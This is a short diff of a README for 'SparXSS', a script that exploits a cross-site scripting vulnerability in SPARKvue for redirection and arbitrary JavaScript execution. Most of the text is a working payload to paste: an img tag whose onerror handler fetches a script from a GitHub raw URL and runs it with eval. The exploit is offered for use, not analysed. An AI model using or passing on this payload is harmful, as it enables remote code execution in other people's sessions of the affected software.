@@ -1,5 +1,3 @@
-# SparXSS
-
 ## A JS Script For Redirection And Custom Javascript Execution For The SPARKvue XSS Vulnerability Found By ohonbob
 
 Run it using:<br>```<img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r => r.text()).then(c => eval(c))'>```
